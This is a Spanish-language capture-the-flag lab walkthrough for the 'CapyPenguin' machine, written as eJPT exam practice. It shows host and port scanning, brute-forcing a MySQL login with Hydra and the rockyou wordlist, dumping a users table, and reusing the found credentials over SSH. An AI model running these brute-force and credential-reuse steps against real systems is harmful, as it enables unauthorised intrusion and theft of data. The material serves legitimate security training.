
---
- TAG: #Ataques #Bases-de-datos #Fuerza-Bruta 
---
# Ataques de Fuerza Bruta a Bases de Datos MySQL con Hydra

En esta clase, aprenderemos a realizar ataques de fuerza bruta a bases de datos MySQL utilizando la herramienta **Hydra**. Vamos a practicar con la máquina **CapyPenguin**, que se encuentra en los siguientes recursos:

- [Máquina CapyPenguin](https://drive.google.com/file/d/1kJsjmttn7McRuj8Tx71ootLMnTnaIWo4/view)
- [CTF Comunidad Hacking Ético](https://ctf.comunidadhackingetico.es/challenges?category=medio)

## Preparativos

1. **Descargar y Configurar la Máquina:**
   - Descargamos el archivo `.ova` de la máquina **CapyPenguin**.
   - Damos doble clic en el archivo para importarlo a VirtualBox.
   - Verificamos que la configuración de red esté en "Adaptador puente".
   - Iniciamos la máquina.

2. **Localizar la Máquina:**
   - Realizamos un escaneo para encontrar la IP de la máquina víctima:
     ```bash
     arp-scan -I wlan0 --localnet
     ```
   - Comprobamos la conectividad con un `ping`.
   - Escaneamos los puertos con **nmap**:
     ```bash
     nmap -p- -sS -sC -sV --open --min-rate=5000 -v -n -Pn 1.2.3.4
     ```
   - Identificamos que el puerto **3306** está abierto, que comúnmente es utilizado por **MySQL**.

## Encontrar el Usuario y Contraseña para MySQL

1. **Buscar Información en la Página Web:**
   - El puerto **80** está abierto, así que investigamos la página web.
   - Encontramos un mensaje en el código fuente que indica un posible usuario:
     ```html
     <p>hola<strong>capybarauser</strong>, esta es una web de capybaras.</p>
     ```

2. **Ataque de Fuerza Bruta con Hydra:**
   - Utilizamos **Hydra** para realizar el ataque de fuerza bruta en el puerto **3306**:
     ```bash
     hydra -l capybarauser -P /usr/share/wordlists/rockyou.txt mysql://1.2.3.4
     ```

   - Si **Hydra** tarda mucho en encontrar la contraseña, es posible que esté al final del archivo `rockyou.txt`. Para acelerar el proceso, invertimos el archivo:
     ```bash
     tac /usr/share/wordlists/rockyou.txt > rockyou_invertido.txt
     ```

   - Eliminamos espacios y caracteres no legibles:
     ```bash
     cat rockyou_invertido.txt | tr -d ' ' > diccionario_sin_espacios.txt
     ```

   - Ejecutamos el ataque de fuerza bruta nuevamente con el diccionario modificado:
     ```bash
     hydra -l capybarauser -P diccionario_sin_espacios.txt mysql://1.2.3.4
     ```

3. **Acceso a la Base de Datos MySQL:**
   - Con la contraseña encontrada, accedemos a MySQL:
     ```bash
     mysql -h 1.2.3.4 -u capybarauser -p<contraseña>
     ```
   - En nuestro caso:
     ```bash
     mysql -h 1.2.3.4 -u capybarauser -pie168
     ```

## Exploración de la Base de Datos

1. **Mostrar las Bases de Datos:**
   ```mysql
   show databases;
   ```

2. **Seleccionar la Base de Datos de Interés:**
   ```mysql
   use pinguinasio_db;
   ```

3. **Mostrar las Tablas:**
   ```mysql
   show tables;
   ```

4. **Consultar las Columnas en la Tabla `users`:**
   ```mysql
   SELECT * FROM users;
   ```

   - Encontramos posibles usuarios y contraseñas en la tabla.

## Acceso a la Máquina a través de SSH

1. **Acceder con las Credenciales Encontradas:**
   - Si encontramos las siguientes credenciales:
     - Usuario: `mario`
     - Contraseña: `pinguinomolon123`
   - Accedemos a la máquina mediante SSH:
     ```bash
     ssh mario@1.2.3.4
     ```
   - Ingresamos la contraseña cuando se nos solicite y ya estaremos dentro de la máquina.

---

Con estos pasos, podrás realizar ataques de fuerza bruta a bases de datos MySQL utilizando **Hydra** y explorar las bases de datos para encontrar credenciales adicionales. Esta es una habilidad valiosa para el examen **eJPT** y para tus prácticas en ciberseguridad. ¡Buena suerte!

